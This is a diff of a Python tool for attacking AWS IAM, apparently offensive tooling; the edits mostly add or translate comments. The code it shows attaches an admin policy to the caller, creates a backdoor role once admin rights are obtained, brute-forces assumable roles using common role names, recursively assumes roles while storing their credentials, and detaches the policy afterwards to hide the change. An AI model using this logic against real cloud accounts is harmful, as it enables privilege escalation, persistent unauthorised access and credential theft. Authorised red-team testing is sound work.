@@ -178,23 +178,28 @@ def attemp_assume(current_entity_name, sts, roles_list, assume_tree):
 
 def exploit(iam, sts, identity_arn, assume_tree, role_recorder):
 
+    # Try to get permissions
     obtainedAdmin_state = attach_policy(iam, identity_arn)
     print(f'> obtained admin {obtainedAdmin_state}')
     
+    # If the backdoor role has not been created and permissions have been successfully obtained
+    # Try to create backdoor
     if not backdoor and obtainedAdmin_state:
         time.sleep(change_effective_waiting_time)
         create_backdoor_state = create_backdoor(iam)
         print(f'> create backdoor {create_backdoor_state}')
 
-    
+    # List possible roles to be assumed
+    # Analyzed from role recoder + Role name explosion dictionary - Already in the Assume tree
     current_entity_name = identity_arn.split('/')[-1]
     trusting_roles = set(role_recorder.find_roles_trusting_principal(current_entity_name, account_id))    
     on_tree_roles = set(assume_tree.get_all_roles())
     possible_assumed_roles = trusting_roles.union(common_role_names) - on_tree_roles 
     print(f'> possible assumed roles {possible_assumed_roles}')
-    
+    # Try Assume
     attemp_assume(current_entity_name, sts, possible_assumed_roles, assume_tree )
     
+    # Clean up
     if obtainedAdmin_state == True:
         detach_policy_state = detach_policy(iam, identity_arn)
         print(f'> clean up policy {"success" if detach_policy_state else "failed"}')
@@ -234,8 +239,8 @@ def recycle(sts, data):
 class IAMAssumeTree:
     def __init__(self, root_role: str):
         self.root = root_role
-        self.nodes: Dict[str, List[str]] = {root_role: []}  # 多叉树结构
-        self.edges: Dict[Tuple[str, str], Dict] = {}        # 边上的 credentials
+        self.nodes: Dict[str, List[str]] = {root_role: []}  # Multi-branch tree structure
+        self.edges: Dict[Tuple[str, str], Dict] = {}        # Credentials on the edges
 
     def add_assume_relation(self, source_role: str, target_role: str, credentials: Optional[Dict] = None) -> bool:
         if source_role not in self.nodes:
@@ -338,6 +343,7 @@ class RoleRecorder:
 
                 principals = [aws_field] if isinstance(aws_field, str) else aws_field
 
+                # Explicitly trusted or trusting all roles
                 for val in principals:
                     if principal_arn in val or val == root_arn:
                         trusted_roles.add(role_name)
@@ -354,19 +360,22 @@ class RoleRecorder:
 
 
 def recursive(sts, iam, assume_tree, role_recorder):
+    # Get current information
     try:
         current_identity_arn = sts.get_caller_identity()['Arn']
     except Exception as e:
         print(f'[!] Faile to get get_caller_identity: {e}')
         
     current_identity_arn = normalize_arn(current_identity_arn)
+    print(f'> current identity_arn: {current_identity_arn}')
     
-    print(f'current identity_arn: {current_identity_arn}')
-    
+    # Try to get more role information with the current role
     role_recorder.update_roles(iam)
     
+    # Exploit the permissions of this role
     exploit(iam, sts, current_identity_arn, assume_tree, role_recorder)
     
+    # Enter the next available role
     children = assume_tree.get_direct_children(current_identity_arn.split('/')[-1])
     for child in children:
         role_name = child['role']
